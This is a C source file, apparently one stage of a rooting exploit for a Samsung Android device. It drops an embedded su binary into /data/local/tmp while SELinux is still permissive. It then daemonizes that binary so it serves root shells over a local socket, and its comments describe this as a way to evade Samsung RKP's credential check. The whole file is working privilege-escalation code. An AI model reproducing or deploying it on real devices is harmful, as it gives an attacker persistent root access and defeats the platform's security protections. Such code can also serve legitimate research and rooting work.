/* Minimal temp_su.sock ephemeral root for Samsung h8q. Writes the embedded
 * su_daemon to /data/local/tmp and daemonizes it while SELinux is still
 * permissive from the exploit (root-stage entry). The daemon serves root
 * shells over the socket by fork+exec inheritance, so it never triggers the
 * Samsung RKP app->root cred check. */
#include "common.h"
#include <fcntl.h>
#include <unistd.h>

#define SU_LOCAL "/data/local/tmp/su"
#define SU_SOCK  "/data/local/tmp/temp_su.sock"
#define SU_LOG   "/data/local/tmp/su_daemon.log"

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n <= 0) return 0;
    p += n; len -= (size_t)n;
  }
  return 1;
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) *daemon_pid = -1;

  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  unlink(SU_LOCAL);
  int fd = open(SU_LOCAL, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    ghost_mark("tempsu: open %s failed errno=%d", SU_LOCAL, errno);
    return 0;
  }
  int ok = write_full(fd, embedded_su_start, size);
  fchmod(fd, 0755);
  close(fd);
  if (!ok) {
    ghost_mark("tempsu: write su failed");
    return 0;
  }
  chmod(SU_LOCAL, 0755);
  ghost_mark("tempsu: wrote su %zu bytes to %s", size, SU_LOCAL);

  unlink(SU_SOCK);
  unlink(SU_LOG);
  pid_t pid = fork();
  if (pid == 0) {
    ghost_mark("tempsu: daemon child pid=%d uid=%d", getpid(), getuid());
    setsid();
    int nfd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (nfd >= 0) dup2(nfd, STDIN_FILENO);
    int lfd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    ghost_mark("tempsu: daemon child log fd=%d errno=%d", lfd, errno);
    if (lfd >= 0) { dup2(lfd, STDOUT_FILENO); dup2(lfd, STDERR_FILENO); }
    ghost_mark("tempsu: daemon child exec %s", SU_LOCAL);
    execl(SU_LOCAL, "su", "--daemon", (char *)NULL);
    ghost_mark("tempsu: daemon child EXEC FAILED errno=%d", errno);
    _exit(127);
  }
  if (pid <= 0) {
    ghost_mark("tempsu: fork daemon failed errno=%d", errno);
    return 0;
  }
  if (daemon_pid) *daemon_pid = pid;

  for (int i = 0; i < 50; i++) {
    if (access(SU_SOCK, F_OK) == 0) {
      ghost_mark("tempsu: daemon ready pid=%d sock=%s", (int)pid, SU_SOCK);
      return 1;
    }
    usleep(100000);
  }
  ghost_mark("tempsu: daemon socket timeout (pid=%d)", (int)pid);
  return 0;
}
